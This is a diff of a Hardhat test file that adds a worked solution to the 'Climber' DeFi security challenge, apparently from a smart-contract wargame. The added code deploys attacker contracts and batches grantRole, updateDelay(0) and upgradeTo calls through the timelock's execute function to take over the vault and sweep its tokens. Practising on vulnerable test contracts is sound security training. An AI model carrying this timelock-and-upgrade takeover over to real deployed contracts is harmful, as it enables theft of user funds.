@@ -2,7 +2,7 @@ const { ethers, upgrades } = require('hardhat');
 const { expect } = require('chai');
 const { setBalance } = require('@nomicfoundation/hardhat-network-helpers');
 
-describe('[Challenge] Climber', function () {
+describe.only('[Challenge] Climber', function () {
     let deployer, proposer, sweeper, player;
     let timelock, vault, token;
 
@@ -16,7 +16,7 @@ describe('[Challenge] Climber', function () {
 
         await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
         expect(await ethers.provider.getBalance(player.address)).to.equal(PLAYER_INITIAL_ETH_BALANCE);
-        
+
         // Deploy the vault behind a proxy using the UUPS pattern,
         // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
         vault = await upgrades.deployProxy(
@@ -29,17 +29,17 @@ describe('[Challenge] Climber', function () {
         expect(await vault.getLastWithdrawalTimestamp()).to.be.gt(0);
         expect(await vault.owner()).to.not.eq(ethers.constants.AddressZero);
         expect(await vault.owner()).to.not.eq(deployer.address);
-        
+
         // Instantiate timelock
         let timelockAddress = await vault.owner();
         timelock = await (
             await ethers.getContractFactory('ClimberTimelock', deployer)
         ).attach(timelockAddress);
-        
+
         // Ensure timelock delay is correct and cannot be changed
         expect(await timelock.delay()).to.eq(TIMELOCK_DELAY);
         await expect(timelock.updateDelay(TIMELOCK_DELAY + 1)).to.be.revertedWithCustomError(timelock, 'CallerNotTimelock');
-        
+
         // Ensure timelock roles are correctly initialized
         expect(
             await timelock.hasRole(ethers.utils.id("PROPOSER_ROLE"), proposer.address)
@@ -58,6 +58,64 @@ describe('[Challenge] Climber', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        // Deploy the attacking contract
+        const AttackContractFactory = await ethers.getContractFactory("AttackTimelock", player);
+        const attackContract = await AttackContractFactory.deploy(
+            vault.address,
+            timelock.address,
+            token.address,
+            player.address);
+
+        // Deploy upgradable contract that will act as new logic contract instead of ClimberVault.sol
+        const MalciousVaultFactory = await ethers.getContractFactory("AttackVault", player);
+        const maliciousVaultContract = await MalciousVaultFactory.deploy();
+
+        const PROPOSER_ROLE = ethers.utils.keccak256(ethers.utils.toUtf8Bytes("PROPOSER_ROLE"));
+
+        // Helper function to create ABIs
+        const createInterface = (signature, methodName, arguments) => {
+            const ABI = signature;
+            const IFace = new ethers.utils.Interface(ABI);
+            const ABIData = IFace.encodeFunctionData(methodName, arguments);
+            return ABIData;
+        }
+
+        // Set attacker contract as "proposer" for timelock
+        const setupRoleABI = ["function grantRole(bytes32 role, address account)"];
+        const grantRoleData = createInterface(setupRoleABI, "grantRole", [PROPOSER_ROLE, attackContract.address]);
+
+        // Update delay to 0
+        const updateDelayABI = ["function updateDelay(uint64 newDelay)"];
+        const updateDelayData = createInterface(updateDelayABI, "updateDelay", [0]);
+
+        // Call to the vault to upgrade to attacker controlled contract logic
+        const upgradeABI = ["function upgradeTo(address newImplementation)"];
+        const upgradeData = createInterface(upgradeABI, "upgradeTo", [maliciousVaultContract.address]);
+
+        // Call Attacking Contract to schedule these actions and sweep funds
+        const exploitABI = ["function exploit()"];
+        const exploitData = createInterface(exploitABI, "exploit", undefined);
+
+        const toAddress = [timelock.address, timelock.address, vault.address, attackContract.address];
+        const data = [grantRoleData, updateDelayData, upgradeData, exploitData]
+
+        // Set our 4 calls to attacking contract
+        await attackContract.setScheduleData(
+            toAddress,
+            data
+        );
+
+        // execute the 4 scheduled calls
+        await timelock.connect(player).execute(
+            toAddress,
+            Array(data.length).fill(0),
+            data,
+            ethers.utils.hexZeroPad("0x00", 32)
+        );
+
+        // Withdraw our funds from attacking contract
+        await attackContract.connect(player).withdraw();
     });
 
     after(async function () {
